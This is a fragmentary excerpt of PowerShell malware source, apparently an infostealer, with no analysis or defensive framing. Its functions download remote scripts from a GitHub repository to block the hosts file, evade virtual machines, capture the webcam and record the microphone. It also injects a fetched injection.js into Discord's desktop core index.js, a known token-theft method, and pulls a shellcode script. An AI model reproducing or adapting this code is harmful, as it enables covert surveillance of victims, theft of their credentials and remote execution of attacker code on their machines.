...
function Invoke-TASKS {
    ...
    if ($blockhostsfile) {
        $link = "https://github.com/Python-is-trash/345345345/raw/main/frontend-src/blockhosts.ps1"
...
function VMPROTECT {
    $link = ("https://github.com/Python-is-trash/345345345/raw/main/frontend-src/antivm.ps1")
...
function Backup-Data {
    ...
    if ($webcam) {
        ...
        $webcam = ("https://github.com/Python-is-trash/345345345/raw/main/frontend-src/webcam.ps1")
    ...
    if ($record_mic) {
        ...
        $mic = ("https://github.com/Python-is-trash/345345345/raw/main/frontend-src/mic.ps1")
            ...
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                ...
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        ...
                        $content = $webClient.DownloadString("https://raw.githubusercontent.com/Python-is-trash/345345345/main/frontend-src/injection.js")
                        if ($content -ne "") {
    ...
    $kematian_shellcode = ("https://github.com/Python-is-trash/345345345/raw/main/frontend-src/kematian_shellcode.ps1")
